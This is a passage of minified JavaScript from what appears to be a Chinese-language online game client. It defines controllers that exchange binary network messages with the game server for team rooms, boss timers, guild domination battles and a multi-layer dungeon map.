e=this.getBytes(101);e.writeInt(t),this.sendToServer(e)},e.prototype.myInfoBack=function(t){this.roomId=t.readDouble(),this.assistCount=t.readInt(),this.reqLookTeamInfo()},e.prototype.sceneBuffInfoBack=function(t){this.playerBuffArr=[],this.monsterBuffArr=[];for(var e=t.readByte(),i=0;e>i;i++)this.playerBuffArr.push(t.readInt());e=t.readByte();for(var i=0;e>i;i++)this.monsterBuffArr.push(t.readInt());this.sceneBossReliveTime=t.readInt()},e.prototype.reqInvitePlayer=function(t){var e=this.getBytes(104);e.writeString(t),this.sendToServer(e);var i=s.GlobalConfig.ClientGlobalConfig.invTime,n=1e3*i+h.GameServerCC.serverTime;this.nextCanInviteTime=n},e.prototype.invitePlayerBack=function(t){var e=t.readString();l.ChatCT.ins().createNewChatMsg(e,0,"",!0)},e.prototype.reqBossInfo=function(){var t=this.getBytes(105);this.sendToServer(t)},e.prototype.bossInfoBack=function(t){var e=t.readByte();this.bossInfoDic={};for(var i=0;e>i;i++){var n=t.readShort(),o=t.readInt();this.bossInfoDic[n]=o}},e.prototype.checkCanInvite=function(){return h.GameServerCC.serverTime-this.nextCanInviteTime>0},e.prototype.getShiKongZhiJingBossList=function(t){if(this._shiKongZhiJingBossDic)return this._shiKongZhiJingBossDic[t];this._shiKongZhiJingBossDic={};for(var e in s.GlobalConfig.HotDesertBossConfig){var i=s.GlobalConfig.HotDesertBossConfig[e];void 0!=i.bossId&&(this._shiKongZhiJingBossDic[0]||(this._shiKongZhiJingBossDic[0]=[]),this._shiKongZhiJingBossDic[0].push(i),this._shiKongZhiJingBossDic[i.bossLv]||(this._shiKongZhiJingBossDic[i.bossLv]=[]),this._shiKongZhiJingBossDic[i.bossLv].push(i))}return this._shiKongZhiJingBossDic[t]},e.prototype.checkMeIsLeader=function(){if(!this.roomInfo||!this.roomInfo.members||0==this.roomInfo.members.length)return!1;for(var t=0,e=this.roomInfo.members;t<e.length;t++){var i=e[t];if(1==i.leaderStatus&&i.roleId==a.ActorCC.actorID)return!0}return!1},e.prototype.burningFbIsGoing=function(){if(!this.roomInfo||!this.roomInfo.members||0==this.roomInfo.members.length)return!1;for(var t=0,e=this.roomInfo.members;t<e.length;t++){var i=e[t];if(i.fbId>0)return!0}return!1},e.prototype.postOpenInviteView=function(){},e.prototype.postShowFightWin=function(){},e.prototype.checkIsFriend=function(t){return this.roomId==t},e.prototype.getBossInfoByFbId=function(t){if(!this.bossInfoDic||91e3==t)return null;for(var e=this.getShiKongZhiJingBossList(0),i=-1,n=0,o=0,a=e;o<a.length;o++){var r=a[o];if(r.fbId==t){i=r.id,n=r.bossId;break}}var l=s.GlobalConfig.MonstersConfig[n];return this.bossInfoDic[i]?{name:null===l||void 0===l?void 0:l.name,time:this.bossInfoDic[i]}:null},e.prototype.getBoosIdByFbid=function(t){for(var e=this.getShiKongZhiJingBossList(0),i=0,n=0,o=e;n<o.length;n++){var s=o[n];if(s.fbId==t){i=s.bossId;break}}return i},e.prototype.checkShowEnter=function(){return this.roomId>0&&!r.GameMap.checkIsInShiKongZhiJing()},__decorate([post()],e.prototype,"postRoomChange",null),__decorate([post()],e.prototype,"buildRoomBack",null),__decorate([post()],e.prototype,"roomMemberInfoBack",null),__decorate([post()],e.prototype,"exitRoomBack",null),__decorate([post()],e.prototype,"myInfoBack",null),__decorate([post()],e.prototype,"sceneBuffInfoBack",null),__decorate([post()],e.prototype,"bossInfoBack",null),__decorate([post()],e.prototype,"postOpenInviteView",null),__decorate([post()],e.prototype,"postShowFightWin",null),e}(o.BaseSystem);e.BurningDesertCT=d,window.BurningDesertCT=d,__reflect(d.prototype,"BurningDesertCT",[]),window.BurningDesertCT=d,Systemap.BurningDesertCT=function(){return d.ins()};var c=function(){function t(){this.members=[]}return t.prototype.parse=function(t){if(this.roomId=t.readDouble(),!(this.roomId<=0)){this.bossLv=t.readByte(),this.members=[],this.count=t.readByte();for(var e=0;e<this.count;e++){var i=new f;i.parse(t),this.members.push(i)}}},t}();e.BurningDesertRoomInfo=c,window.BurningDesertRoomInfo=c,__reflect(c.prototype,"BurningDesertRoomInfo",[]),window.BurningDesertRoomInfo=c;var f=function(){function t(){}return t.prototype.parse=function(t){this.roleId=t.readInt(),this.leaderStatus=t.readByte(),this.playerName=t.readString(),this.job=t.readByte(),this.sex=t.readByte(),this.zsLv=t.readInt(),this.lv=t.readInt(),this.titleId=t.readInt(),this.appearanceId=t.readInt(),this.fbId=t.readInt(),this.power=t.readDouble()},t}();e.BurningDesertMemberVo=f,window.BurningDesertMemberVo=f,__reflect(f.prototype,"BurningDesertMemberVo",[]),window.BurningDesertMember=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CommonHelpWin=void 0;var n=i(1),o=i(234),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HelpTipsSkin",e.gonglueText=new o.GongLueText,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.skin&&(this.gonglueText.richText=t[0],this.gonglueText.textWidth=this.scrollerGroup.width,this.scrollerGroup.addChild(this.gonglueText))},e}(n.BaseView);e.CommonHelpWin=s,window.CommonHelpWin=s,__reflect(s.prototype,"CommonHelpWin",[]),window.CommonHelpWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBaseNoName=void 0;var n=i(11),o=function(t){function e(){var e=t.call(this)||this;return e.isShowName(!1),e}return __extends(e,t),e}(n.ItemBase);e.ItemBaseNoName=o,window.ItemBaseNoName=o,__reflect(o.prototype,"ItemBaseNoName",[]),window.ItemBaseNoName=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.fightEnum=e.DominateWorldCT=void 0;var n=i(8),o=i(14),s=i(17),a=i(0),r=i(15),l=i(6),h=i(53),u=i(23),p=i(107),d=i(28),c=i(12),f=i(160),g=i(7),m=i(187),v=i(2),y=i(330),C=i(232),T=i(332),b=function(t){function e(){var e=t.call(this)||this;return e.isOpenWin=!1,e.isRuleOpen=!1,e.isPanelOpen=!1,e.panelCount=0,e.nowFightType=0,e.dominateInfo=[],e.baseCityId=0,e.myWorldId=0,e.myWorldType=0,e.entityServer=0,e.WinId=0,e.entityServerName="",e.applicationState=0,e.resultAward=0,e.setTotemFightArr=[],e.setTotemFightGo=[],e.tutemIdxMax=0,e.evGuardIdxMax=0,e.actState=0,e.fbSwitch=!1,e._collectStatus=0,e.collectOwnerHandle=0,e.collectSwordHandles=0,e.sysId=PackageID.Guanqia,e.regNetMsg(160,e.postDominateWorldInfo),e.regNetMsg(161,e.postDominateApplicationInfo),e.regNetMsg(163,e.postDominateFbInfo),e.regNetMsg(164,e.postDominateAward),e.regNetMsg(165,e.postDominateWorldDesc),e.regNetMsg(166,e.postStartFbTime),e.regNetMsg(167,e.postFbRealTimeInfo),e.regNetMsg(168,e.postPlayerFbData),e.regNetMsg(169,e.postFbSwitchData),e.regNetMsg(170,e.postDominateTotem),e.regNetMsg(171,e.postDominateTotemInfo),e.regNetMsg(172,e.updateDominateTotemFight),e.regNetMsg(175,e.updateDominateMagicSwordFight),e.regNetMsg(176,e.updateDominateMagicSwordGet),e.regNetMsg(177,e.updateDominateSwordData),e.regNetMsg(180,e.updateDominateNimbusFightDescGet),e.regNetMsg(185,e.updateDominateAppState),e.initRed(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRed=function(){this.AllBagRed=new s.RedPoint(this.returnRedP,l.BagCT.ins().postItemChange,this.updateRed,this.updateAward,this.updateDominateWorldBtnShow)},e.prototype.setInitInfo=function(){var t=a.GlobalConfig.DominationCfg.totemIndex2Pos[1];if(t){this.tutemIdxMax=0;for(var e in t)this.tutemIdxMax++}var i=a.GlobalConfig.DominationCfg.guard;i&&(this.evGuardIdxMax=i.length)},e.prototype.returnRedP=function(){return c.OpenSystem.ins().checkSysOpen(r.SystemType.Dominate)?0==d.Guild.ins().guildID?!1:2==e.ins().resultAward?!0:1==e.ins().actState&&2==e.ins().applicationState?!0:e.ins().myWorldType==w.TotemFight&&2==e.ins().actState&&d.Guild.ins().myOffice>=p.GuildOffice.GUILD_JINGYING?!0:e.ins().fbSwitch?!0:!1:!1},e.prototype.sendDominateInfo=function(){var t=this.getBytes(160);this.sendToServer(t)},e.prototype.postDominateWorldInfo=function(t){this.dominateInfo=[];for(var i=0,n=t.readUnsignedByte(),o=0;n>o;o++){for(var s=t.readUnsignedByte(),a=t.readUnsignedByte(),r=[],l=0;a>l;l++){i++;var h=t.readUnsignedShort(),u=t.readInt(),p=t.readString();r.push({id:h,server:u,name:p})}this.dominateInfo.push({lv:s,worldData:r})}if(this.myWorldId=t.readUnsignedShort(),this.myWorldType=t.readUnsignedByte(),this.entityServer=t.readInt(),this.entityServer>0&&(this.entityServerName=t.readString()),i>0){var d=this.returnLvInfo(1);d?this.baseCityId=d.worldData[0].id:this.baseCityId=0}else this.baseCityId=0;this.panelCount=i,this.isOpenWin=!0,e.ins().isRuleOpen&&(win.open(f.PlayWayWin,f.PlayWayPage.dominate),e.ins().isRuleOpen=!1),e.ins().isPanelOpen&&(this.updateOpenPanel(),e.ins().isPanelOpen=!1),this.updateRed()},e.prototype.updateOpenPanel=function(){},e.prototype.updateRed=function(){},e.prototype.returnLvInfo=function(t){for(var e in this.dominateInfo)if(this.dominateInfo[e].lv==t)return this.dominateInfo[e];return null},e.prototype.returnWorldIdInfo=function(t){for(var e in this.dominateInfo){var i=this.dominateInfo[e].worldData,n=0;for(var o in i){if(i[o].id==t)return{lv:this.dominateInfo[e].lv,idx:n,dataArr:i[o]};n++}}return null},e.prototype.sendApplicationDominate=function(){var t=this.getBytes(161);this.sendToServer(t)},e.prototype.postDominateApplicationInfo=function(t){this.applicationState=t.readUnsignedByte(),this.updateApplicationState()},e.prototype.updateApplicationState=function(){},e.prototype.sendApplicationComeDominate=function(){var t=this.getBytes(162);this.sendToServer(t)},e.prototype.sendFbDominate=function(){var t=this.getBytes(163);this.sendToServer(t)},e.prototype.postDominateFbInfo=function(t){var e=t.readUnsignedByte();if(this._collectStatus=0,this.collectOwnerHandle=0,3==e){var i=t.readInt();v.TipsCT.ins().showTips(gettext("加入行会冷却中，剩余"+i+"秒"))}},e.prototype.sendAwardDominate=function(){var t=this.getBytes(164);this.sendToServer(t)},e.prototype.postDominateAward=function(t){this.resultAward=t.readUnsignedByte(),this.updateAward()},e.prototype.updateAward=function(){},e.prototype.sendDominateWorldDesc=function(t){var e=this.getBytes(165);e.writeUnsignedShort(t),this.sendToServer(e)},e.prototype.postDominateWorldDesc=function(t){for(var i=t.readUnsignedShort(),n=t.readUnsignedByte(),o=t.readUnsignedByte(),s=[],r=0;o>r;r++){var l=t.readInt(),h=t.readString();s.push({server:l,guildName:h})}var u=e.ins().returnWorldIdInfo(i);if(u){var p=a.GlobalConfig.DominationBtLvCfg,d=u.lv,c=u.idx,f=p[d].townName[c];win.open(C.DominateWorldCityDesc,2,{lv:d,cityName:f,worldId:i,type:n,wins:u.dataArr.server,data:s})}},e.prototype.postStartFbTime=function(t){this.nowFightType=t.readUnsignedByte()},e.prototype.postFbRealTimeInfo=function(t){for(var e=t.readUnsignedByte(),i=0,n=0,o=0;e>o;o++){var s=t.readInt(),a=t.readUnsignedShort();s==d.Guild.ins().guildID?i=a:n=a}this.updateTotemScoreFB(i,n)},e.prototype.updateTotemScoreFB=function(t,e){return{AS:t,BS:e}},e.prototype.postPlayerFbData=function(t){var e=t.readUnsignedShort();this.updatePlayerScoreFB(e)},e.prototype.updatePlayerScoreFB=function(t){return t},e.prototype.postFbSwitchData=function(t){var e=t.readUnsignedByte();this.fbSwitch=1==e?!0:!1,this.updateDominateWorldBtnShow()},e.prototype.updateDominateWorldBtnShow=function(){},e.prototype.sendDominateTotem=function(){var t=this.getBytes(170);this.sendToServer(t)},e.prototype.postDominateTotem=function(t){var e=t.readString();if(this.setTotemFightArr=[],e&&""!=e&&"nil"!=e){for(var i=t.readUnsignedByte(),n=0;i>n;n++){for(var o=t.readUnsignedByte(),s=[],a=0;o>a;a++){for(var r=t.readUnsignedByte(),l=t.readUnsignedByte(),h=[],u=0;l>u;u++){var p=t.readUnsignedByte(),d=t.readUnsignedByte();h.push({type:p,index:d})}s.push({type:r,dataArr:h})}this.setTotemFightArr.push({dataArr:s})}var c={changeName:e};win.open(T.DominateWorldTotemFightPanel,c)}else win.open(T.DominateWorldTotemFightPanel)},e.prototype.sendDominateTotemSetting=function(t){var e=this.getBytes(171);e.writeByte(t.length);for(var i=0;i<t.length;i++){e.writeByte(t[i].length);for(var n=0;n<t[i].length;n++){var o=t[i];e.writeByte(o[n].type),e.writeByte(o[n].count);for(var s=0;s<o[n].count;s++){var a=o[n];e.writeByte(a.data[s].type),e.writeByte(a.data[s].index)}}}this.sendToServer(e),console.error("保存图腾设置成功~"),win.close(T.DominateWorldTotemFightPanel)},e.prototype.postDominateTotemInfo=function(t){var e=t.readString();win.close(T.DominateWorldTotemFightPanel),v.TipsCT.ins().showTips(gettext(e+"正在修改地图"))},e.prototype.sendDominateTotemFight=function(){var t=this.getBytes(172);this.sendToServer(t)},e.prototype.updateDominateTotemFight=function(t){for(var e=t.readUnsignedByte(),i=[],o=0;e>o;o++){var s=t.readString(),a=t.readInt(),r=t.readString(),l=t.readUnsignedByte(),u=t.readUnsignedByte(),p=t.readUnsignedByte();i.push({roleName:s,serverId:a,guildName:r,killCount:l,tutemFC:u,tutemTC:p})}for(var c=this.customSortDescendingTotem(i),f=t.readUnsignedByte(),m=0,v=0,o=0;f>o;o++){var C=t.readInt(),T=t.readUnsignedShort();C==d.Guild.ins().guildID?m=T:v=T}var b=t.readInt();this.WinId=b;var w=t.readInt(),I=Math.floor((n.DateUtils.formatMiniDateTime(w)-g.GameServerCC.serverTime)/1e3);0==b?win.open(y.DominateFightResultWin,0,m,v,c,1,0):(win.close(y.DominateFightResultWin),win.open(y.DominateFightResultWin,b,m,v,c,2,I),h.ControlCC.setAuto(!1),h.ControlCC.setCurTar(null))},e.prototype.sendDominateMagicSwordFight=function(){var t=this.getBytes(175);this.sendToServer(t)},e.prototype.updateDominateMagicSwordFight=function(t){for(var e=t.readUnsignedByte(),i=[],o=0;e>o;o++){var s=t.readString(),a=t.readInt(),r=t.readString(),l=t.readUnsignedShort(),u=t.readUnsignedShort(),p=t.readUnsignedShort();i.push({roleName:s,serverId:a,guildName:r,killScore:l,swordTime:u,swordScore:p})}for(var c=this.customSortDescendingMagic(i),f=t.readUnsignedByte(),m=0,v=0,o=0;f>o;o++){var C=t.readInt(),T=t.readUnsignedShort();C==d.Guild.ins().guildID?m=T:v=T}var b=t.readInt(),w=t.readInt(),I=Math.floor((n.DateUtils.formatMiniDateTime(w)-g.GameServerCC.serverTime)/1e3);this.WinId=b,0==b?win.open(y.DominateFightResultWin,0,m,v,c,1,0):(win.close(y.DominateFightResultWin),win.open(y.DominateFightResultWin,b,m,v,c,2,I),h.ControlCC.setAuto(!1),h.ControlCC.setCurTar(null))},e.prototype.sendDominateMagicSwordGet=function(){var t=this.getBytes(176);t.writeDouble(this.collectSwordHandles),this.sendToServer(t)},e.prototype.updateDominateMagicSwordGet=function(t){var i=t.readUnsignedByte();this.collectOwnerHandle=i;var o=t.readInt(),s=Math.floor((n.DateUtils.formatMiniDateTime(o)-g.GameServerCC.serverTime)/1e3);1==i&&o?(h.ControlCC.isAuto&&(h.ControlCC.setAuto(!1),h.ControlCC.setCurTar(null)),win.open(m.CollectWin,0,s),u.GameLogic.ins().currAttackHandle=0):2==i&&(e.ins().collectStatus=0,e.ins().collectOwnerHandle=0,v.TipsCT.ins().showTips(gettext("采集失败")))},e.prototype.updateDominateSwordData=function(t){var e=t.readUnsignedByte();1==e&&(this.collectStatus=0,win.close(m.CollectWin),h.ControlCC.setAuto(!0))},e.prototype.sendDominateNimbusFightDesc=function(){var t=this.getBytes(180);this.sendToServer(t)},e.prototype.updateDominateNimbusFightDescGet=function(t){for(var e=t.readUnsignedByte(),i=[],o=0;e>o;o++){var s=t.readString(),a=t.readInt(),r=t.readString(),l=t.readUnsignedShort(),u=t.readUnsignedShort(),p=t.readUnsignedShort();i.push({roleName:s,serverId:a,guildName:r,killScore:l,harmScore:u,totalScore:p})}for(var c=this.customSortDescendingNimbus(i),f=t.readUnsignedByte(),m=0,v=0,o=0;f>o;o++){var C=t.readInt(),T=t.readUnsignedShort();C==d.Guild.ins().guildID?m=T:v=T}var b=t.readInt(),w=t.readInt(),I=Math.floor((n.DateUtils.formatMiniDateTime(w)-g.GameServerCC.serverTime)/1e3);this.WinId=b,0==b?win.open(y.DominateFightResultWin,0,m,v,c,1,0):(win.close(y.DominateFightResultWin),win.open(y.DominateFightResultWin,b,m,v,c,2,I),h.ControlCC.setAuto(!1),h.ControlCC.setCurTar(null))},e.prototype.updateDominateAppState=function(t){this.actState=t.readUnsignedByte(),this.updateDominateApp()},e.prototype.updateDominateApp=function(){},e.prototype.dominateWorldEnterShow=function(){return c.OpenSystem.ins().checkSysOpen(r.SystemType.Dominate)?!0:!1},e.prototype.updateTotemArr=function(t,e,i){for(var n=[],o=[],s=this.tutemIdxMax,a=i.length,r=[],l=1;l<=this.tutemIdxMax;l++){var h=void 0;h=l==e?{type:1,index:e}:{type:2,index:l},n.push(h)}r.push({type:1,count:s,data:n});for(var l=0;l<i.length;l++){var h={type:l+1,index:i[l]};o.push(h)}r.push({type:2,count:a,data:o}),this.setTotemFightGo[t]=r},e.prototype.customSortDescendingTotem=function(t){return t.sort(function(t,e){var i=t.tutemTC,n=e.tutemTC;if(i===n){var o=t.tutemFC,s=e.tutemFC;if(o===s){var a=t.killCount,r=e.killCount;return r-a}return s-o}return n-i})},e.prototype.customSortDescendingMagic=function(t){return t.sort(function(t,e){var i=t.swordScore,n=e.swordScore;if(i===n){var o=t.swordTime,s=e.swordTime;if(o===s){var a=t.killScore,r=e.killScore;return r-a}return s-o}return n-i})},e.prototype.customSortDescendingNimbus=function(t){return t.sort(function(t,e){var i=t.totalScore,n=e.totalScore;if(i===n){var o=t.harmScore,s=e.harmScore;if(o===s){var a=t.killScore,r=e.killScore;return r-a}return s-o}return n-i})},Object.defineProperty(e.prototype,"collectStatus",{get:function(){return this._collectStatus},set:function(t){this._collectStatus=t,2==t&&this.sendDominateMagicSwordGet()},enumerable:!1,configurable:!0}),__decorate([post()],e.prototype,"updateOpenPanel",null),__decorate([post()],e.prototype,"updateRed",null),__decorate([post()],e.prototype,"updateApplicationState",null),__decorate([post()],e.prototype,"updateAward",null),__decorate([post()],e.prototype,"updateTotemScoreFB",null),__decorate([post()],e.prototype,"updatePlayerScoreFB",null),__decorate([post()],e.prototype,"updateDominateWorldBtnShow",null),__decorate([post()],e.prototype,"updateDominateApp",null),e}(o.BaseSystem);e.DominateWorldCT=b,window.DominateWorldCT=b,__reflect(b.prototype,"DominateWorldCT",[]),Systemap.DominateWorldCT=function(){return b.ins()},window.DominateWorldCT=b;var w;!function(t){t[t.TotemFight=1]="TotemFight",t[t.SowrdFight=2]="SowrdFight",t[t.NimbusFight=3]="NimbusFight"}(w=e.fightEnum||(e.fightEnum={})),window.fightEnum=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixReisCT=void 0;var n=i(8),o=i(14),s=i(0),a=i(4),r=i(20),l=i(58),h=i(45),u=i(32),p=i(7),d=i(2),c=i(644),f=i(219),g=function(t){function e(){var e=t.call(this)||this;return e.isSixReis=!1,e.sixLayer=1,e.playerLayer=1,e.tfMembers=[],e.sixBasePos=[],e.sixBaseMap=[],e.sixBuffPos=[],e.nextCanInviteTime=0,e.isCostTools=0,e.pos=-1,e.hadHelpCount=0,e.showMapArrTwoMaxValue=[],e.showDirArr=[],e.rightBoArr=[],e.showMapCount=0,e.sixMapArr=[],e.openLayer=1,e.isChangeScene=!1,e.sysId=PackageID.SixTrails,e.regNetMsg(1,e.postSetTeamInfo),e.regNetMsg(3,e.exitTeamBack),e.regNetMsg(4,e.enterTeamBack),e.regNetMsg(6,e.doGetTeamInvite),e.regNetMsg(9,e.doReturnUnlockPos),e.regNetMsg(10,e.psetPlayerBaseInfo),e.regNetMsg(11,e.postReturnPosInfo),e.regNetMsg(12,e.postReturnSixBossMag),e.regNetMsg(13,e.doPosUnlockPos),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postGetTeamInfo=function(){var t=this.getBytes(1);this.sendToServer(t)},e.prototype.postSetTeamInfo=function(t){var e=t.readByte();this.isTFCaptain=!1,this.tfMembers=[];for(var i=0;e>i;i++){var n=new c.SixReinTeam;n.parse(t),this.tfMembers.push(n),n.roleID==a.ActorCC.actorID&&1==n.position&&(this.isTFCaptain=!0),n.roleID==a.ActorCC.actorID&&(this.pos=n.pos,this.playerLayer=n.layer)}this.isSixReis=this.tfMembers.length>0?!0:!1,this.setBaseMapState(),this.updateMap()},e.prototype.postCreateTeam=function(){var t=this.getBytes(2);this.sendToServer(t)},e.prototype.postOutTeam=function(){var t=this.getBytes(3);this.sendToServer(t)},e.prototype.exitTeamBack=function(t){var e=t.readByte();switch(e){case 1:this.isSixReis=!1,this.tfMembers=[],d.TipsCT.ins().showTips(gettext("退出队伍成功！"))}},e.prototype.postInTeam=function(t){var e=this.getBytes(4);e.writeInt(t),this.sendToServer(e)},e.prototype.postOutOne=function(t){var e=this.getBytes(5);e.writeInt(t),this.sendToServer(e)},e.prototype.enterTeamBack=function(t){var e=t.readByte();if(1==e)win.open(f.SixTeamRoomWin);else switch(e){case 2:d.TipsCT.ins().showTips(gettext("无队伍"));break;case 3:d.TipsCT.ins().showTips(gettext("队伍已满"))}},e.prototype.sendTeamInvite=function(){var t=this.getBytes(6);this.sendToServer(t)},e.prototype.doGetTeamInvite=function(t){var e=t.readString(),i=t.readString(),n=l.LangUtils.analysis(e,i);h.ChatCT.ins().createNewChatMsg(n,0,e,!0)},e.prototype.postEnterSix=function(){var t=this.getBytes(7);t.writeInt(this.sixLayer),this.sendToServer(t)},e.prototype.postChangeSixPos=function(t){if(!this.isChangeScene){var e=this.getBytes(8);e.writeInt(t),this.sendToServer(e),this.isChangeScene=!0,this.isGoCity()}},e.prototype.isGoCity=function(){this.isChangeScene=!1},e.prototype.doReturnUnlockPos=function(t){var e=t.readUnsignedShort();if(1==e)for(var i=0;e>i;i++){var n={layer:t.readUnsignedByte(),id:t.readInt()};if(n.layer==this.sixLayer){for(var o in this.sixBasePos)if(this.sixBasePos[o].id==n.id)return;this.sixBasePos.push(n)}}else if(this.sixBasePos=[],r.GameMap.fbType==u.FbCT.FB_TYPE_LIU_DAO_LUN_HUI)for(var i=0;e>i;i++){var n={layer:t.readUnsignedByte(),id:t.readInt()};if(n.layer==this.sixLayer){for(var s in this.sixBasePos)if(this.sixBasePos[s].id==n.id)return;this.sixBasePos.push(n)}}else for(var i=0;e>i;i++){var n={layer:t.readUnsignedByte(),id:t.readInt()};this.sixBasePos.push(n)}r.GameMap.fbType==u.FbCT.FB_TYPE_LIU_DAO_LUN_HUI&&(this.upDateOpenLayer(),this.setBaseMapState(),this.updateMap())},e.prototype.upDateOpenLayer=function(){this.openLayer=1;for(var t in this.sixBasePos)this.sixBasePos[t].layer>this.openLayer&&(this.openLayer=this.sixBasePos[t].layer)},e.prototype.setTakeTools=function(){var t=this.getBytes(10);this.sendToServer(t)},e.prototype.psetPlayerBaseInfo=function(t){this.nextCanInviteTime=n.DateUtils.formatMiniDateTime(t.readInt()),this.isCostTools=t.readByte(),this.hadHelpCount=t.readByte()},e.prototype.postReturnPosInfo=function(t){var e=t.readUnsignedByte(),i=t.readUnsignedByte();if(1==i){if(this.sixBaseMap.length>0){var n=t.readInt(),o=t.readUnsignedShort(),s=t.readInt();if(e==this.sixLayer)for(var a in this.sixBaseMap)this.sixBaseMap[a].layer==n&&(this.sixBaseMap[a].time=s)}return void this.setBaseMapState()}if(0==this.sixBaseMap.length){this.sixBaseMap=[],this.sixBasePos=[];for(var a=0;i>a;a++){var n=t.readInt(),o=t.readUnsignedShort(),r=t.readInt(),l={layer:n,type:o,time:r,state:0};e==this.sixLayer&&this.sixBaseMap.push(l)}}else if(this.sixBaseMap.length>0){var n=t.readInt(),o=t.readUnsignedShort(),s=t.readInt();if(e==this.sixLayer)for(var a in this.sixBaseMap)this.sixBaseMap[a].layer==n&&(this.sixBaseMap[a].time=s)}this.setBaseMapState()},e.prototype.postReturnSixBossMag=function(t){var e=t.readByte(),i="";switch(e){case 1:i=s.GlobalConfig.SixUndergroundPalacesBaseConfig.killWords[0];break;case 2:i=s.GlobalConfig.SixUndergroundPalacesBaseConfig.killWords[1];break;case 3:i=s.GlobalConfig.SixUndergroundPalacesBaseConfig.killWords[2];break;case 4:i=s.GlobalConfig.SixUndergroundPalacesBaseConfig.killWords[3]}h.ChatCT.ins().createNewChatMsg1(i)},e.prototype.doPosUnlockPos=function(t){var e=t.readByte(),i=t.readUnsignedShort();this.sixBuffPos=[];for(var n=0;i>n;n++){var o=t.readInt(),s=t.readUnsignedByte(),a={pos:o,buffIdx:s};e==this.sixLayer&&this.sixBuffPos.push(a)}},e.prototype.returnBuffIdx=function(t){for(var e in this.sixBuffPos)if(this.sixBuffPos[e].pos==t)return this.sixBuffPos[e].buffIdx;return 0},e.prototype.checkMeIsLeader=function(){if(!this.tfMembers||!this.tfMembers.length)return!1;for(var t=0,e=this.tfMembers;t<e.length;t++){var i=e[t];if(1==i.position&&i.roleID==a.ActorCC.actorID)return!0}return!1},e.prototype.checkCanInvite=function(){return p.GameServerCC.serverTime-this.nextCanInviteTime>0},e.prototype.checkIsTeamer=function(t){if(!this.tfMembers||!this.tfMembers.length)return!1;for(var e=0,i=this.tfMembers;e<i.length;e++){var n=i[e];if(n.roleID==t)return!0}return!1},e.prototype.selectValue=function(t){return t},e.prototype.isShow=function(t){return this.isPosUnlock(t)?1:t==e.ins().pos?2:this.isHadId(t+1e3)?2:this.isHadId(t-1e3)?2:this.isHadId(t-1)?2:this.isHadId(t+1)?2:0},e.prototype.isHadId=function(t){for(var e in this.sixBasePos)if(t==this.sixBasePos[e].id)return!0;return!1},e.prototype.returnMapData=function(t){for(var e in this.sixBaseMap)if(t==this.sixBaseMap[e].layer)return this.sixBaseMap[e];return null},e.prototype.isPosUnlock=function(t){for(var e in this.sixBasePos)if(t==this.sixBasePos[e].id)return!0;return!1},e.prototype.returnFindMapCount=function(){var t=0;for(var e in this.sixBaseMap){var i=this.sixBaseMap[e].layer;2==this.isShow(i)&&t++}return t},e.prototype.updateMap=function(){},e.prototype.setBaseMapState=function(){if(!(this.pos<=0)){this.sixMapArr=[];for(var t=0;t<this.sixBaseMap.length;t++)for(var e=0;e<this.sixBasePos.length;e++)1!=this.sixBaseMap[t].state&&this.sixBaseMap[t].layer==this.sixBasePos[e].id&&(this.sixBaseMap[t].state=1);for(var t=0;t<this.sixBaseMap.length;t++)(0==this.sixBaseMap[t].state||3==this.sixBaseMap[t].state)&&(2==this.isShow(this.sixBaseMap[t].layer)&&(this.sixBaseMap[t].state=2),this.sixBaseMap[t].layer==this.pos&&0==this.sixBaseMap[t].state&&(this.sixBaseMap[t].state=2));for(var i=s.GlobalConfig.SixUndergroundPalacesLayerConfig[this.sixLayer].size,t=0;t<this.sixBaseMap.length;t++)if(0==this.sixBaseMap[t].state){var n=0,o=this.sixBaseMap[t-i[1]];if(o){if(1==o.state)continue;2==o.state&&n++}if(t-1>0&&Math.floor((t-1)/i[1])==Math.floor(t/i[1])){var a=this.sixBaseMap[t-1];if(a){if(1==a.state)continue;2==a.state&&n++}}if(100>t+1&&Math.floor((t+1)/i[1])==Math.floor(t/i[1])){var r=this.sixBaseMap[t+1];if(r){if(1==r.state)continue;2==r.state&&n++}}var l=this.sixBaseMap[t+i[1]];if(l){if(1==l.state)continue;2==l.state&&n++}n>0&&(this.sixBaseMap[t].state=3)}for(var t in this.sixBaseMap)0!=this.sixBaseMap[t].state&&this.sixMapArr.push(this.sixBaseMap[t]);this.showMapArrTwoMaxValue=[10010,10010];var h=[1001,1001];for(var t in this.sixMapArr)this.sixMapArr[t].layer%100<this.showMapArrTwoMaxValue[0]%100&&(this.showMapArrTwoMaxValue[0]=this.sixMapArr[t].layer),this.sixMapArr[t].layer<this.showMapArrTwoMaxValue[1]&&(this.showMapArrTwoMaxValue[1]=this.sixMapArr[t].layer),this.sixMapArr[t].layer%100>h[0]%100&&(h[0]=this.sixMapArr[t].layer),this.sixMapArr[t].layer>h[1]&&(h[1]=this.sixMapArr[t].layer);
this.showDirArr=[],this.showDirArr[0]=this.showMapArrTwoMaxValue[0]%100,this.showDirArr[1]=Math.floor(this.showMapArrTwoMaxValue[1]/1e3),this.rightBoArr=[],this.rightBoArr.push(h[0]%100-this.showDirArr[0]+1),this.rightBoArr.push(Math.floor(h[1]/1e3)-this.showDirArr[1]+1),this.showMapCount=this.rightBoArr[0]*this.rightBoArr[1],this.updateMap()}},e.prototype.returnFindMapCountByLayer=function(t){var e=0;for(var i in this.sixBasePos)t==this.sixBasePos[i].layer&&e++;return e},e.prototype.openSixPanel=function(){return p.GameServerCC.serverTime?!1:void 0},e.prototype.formatStrTimeToArr=function(){var t=s.GlobalConfig.SixUndergroundPalacesBaseConfig,e=t.closeTime[0],i=t.closeTime[1],o=i.split("-"),a=p.GameServerCC.serverTime,r=new Date(a),l=r.getDay();if(e==l){var h=n.DateUtils.formatStrTimeToToday1(o[0],a),u=n.DateUtils.formatStrTimeToToday1(o[1],a);if(a>=h&&u>=a)return 